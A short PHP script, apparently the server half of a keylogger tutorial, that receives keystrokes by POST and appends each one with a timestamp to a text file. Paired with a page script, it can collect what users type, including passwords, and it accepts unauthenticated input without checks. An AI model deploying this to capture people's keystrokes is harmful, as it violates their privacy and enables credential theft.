// keylog.php

<?php
// (A) OPEN KEYLOG FILE, APPEND MODE
$file = fopen("keylog.txt", "a+");

// (B) SAVE KEYSTROKES
if(isset($_POST["key"])) {
    $key = $_POST["key"];
    $time = date("Y-m-d H:i:s"); // Get the current time
    $log = "Key: $key, Time: $time";
    fwrite($file, $log . PHP_EOL);
}

// (C) CLOSE & END
fclose($file);
echo "OK";
?>
